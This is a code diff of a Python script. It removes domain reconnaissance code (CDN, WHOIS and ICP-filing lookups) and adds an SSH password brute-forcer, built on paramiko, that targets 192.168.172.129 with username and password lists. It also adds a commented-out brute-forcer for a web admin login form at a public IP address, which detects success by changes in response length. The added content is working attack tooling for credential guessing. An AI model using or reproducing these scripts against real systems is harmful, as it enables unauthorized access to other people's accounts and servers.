@@ -1,70 +1,60 @@
 import requests
-from lxml import etree
 from bs4 import BeautifulSoup
-import whois
-from urllib.parse import quote
+import paramiko
+
+for u in open('users.txt','r').readlines():
+    u = u.replace('\n','')
+    for p in open('pwd.txt','r').readlines():
+        p = p.replace('\n','')
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(hostname='192.168.172.129', port=22, username=u, password=p)
+            print(u,p)
+            break
+        except:
+            pass
 
 
-# 基础信息收集模块
-class FoundationInfo():
-    # 判断是否是CDN   domain：域名
-    def get_cdn(self, domain):
-        data = {
-            'type': 'host',
-            'host': domain,
-            'hfUrl': domain,
-            't': '电信, 联通, 移动'
-        }
-        res = requests.post(url=f'https://cdn.chinaz.com/search/?host={domain}', data=data)
-        res = etree.HTML(res.text)
-        iscdn = True
-        data = res.xpath('/html/body/div[3]/text()')
-        if data[0].find('不属于CDN云加速') != -1:
-            print('存在CDN')
-        else:
-            iscdn = False
-            print('不属于CDN')
-        return iscdn
 
-    # 获取whois信息   domain：域名
-    def get_whois(self, domain):
-        res = whois.whois(domain)
-        email = res['emails']
-        return res
-
-    # 获取IPC备案号
-    def get_ipc(self, domain, type):
-        datlist = []
-        # 备案号反查域名
-        if type == 'ipctodomain':
-            res = requests.get(url=f'https://www.beianx.cn/search/{quote(domain)}')
-            soup = BeautifulSoup(res.text, 'html.parser')
-            res = soup.find_all('tr')
-            datlist = []
-            for i in res:
-                finda = i.find_all('a')
-                for a in finda:
-                    if a['href'].find('seo') != -1:
-                        datlist.append(a.text)
-
-        else:
-            # 域名查询备案号
-            res = requests.get(url=f'https://www.beianx.cn/search/{domain}')
-            soup = BeautifulSoup(res.text, 'html.parser')
-            datas = soup.find_all(class_='align-middle')
-            dname = datas[1].text.replace('\n', '')
-            datlist.append(dname)
-            xingz = datas[2].text.replace(' ', '').replace('\n', '')
-            datlist.append(xingz)
-            ipc_id = datas[3].text.replace(' ', '').replace('\n', '')
-            datlist.append(ipc_id)
-        return datlist
-
-    # 查询注册人
-    def fancha(self, domain):
-        res = self.get_whois(domain)
-        return str(res['name']).encode('utf-8').decode()
-
-found = FoundationInfo()
-res = found.fancha('iredteam.cn')
-print(res)
+# url = 'http://39.104.63.123/admindm-yourname/mod_common/login.php'
+# res = requests.get(url,verify=False).text
+# soup = BeautifulSoup(res,'html.parser')
+#
+# action = soup.find('form').get('action')
+# print(action)
+# if action[-1] == '/':
+#     action = action[:-2]
+# url1 = url.split('/')
+# url1[-1] = action
+# login_url = '/'.join(url1)
+# print(login_url)
+# all_input = soup.find_all('input')
+# uname = ''
+# pwd = ''
+# for i in all_input:
+#     if i.get('name').find('u') == 0:
+#         uname = i.get('name')
+#     if i.get('name').find('p') == 0:
+#         pwd = i.get('name')
+# num = 0
+# res_count = 0
+# for u in open('users.txt','r').readlines():
+#     u = u.replace('\n','')
+#     for p in open('pwd.txt','r').readlines():
+#         p = p.replace('\n','')
+#         head = {
+#             'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
+#         }
+#         payload = {
+#             uname:u,
+#             pwd:p
+#         }
+#         login_res = requests.post(url=login_url,data=payload).text
+#         print(login_res)
+#         if num == 0:
+#             res_count = len(login_res)
+#             num = num +1
+#         if len(login_res) > res_count + 5 or len(login_res) < res_count:
+#             print(u,p)
+#             break
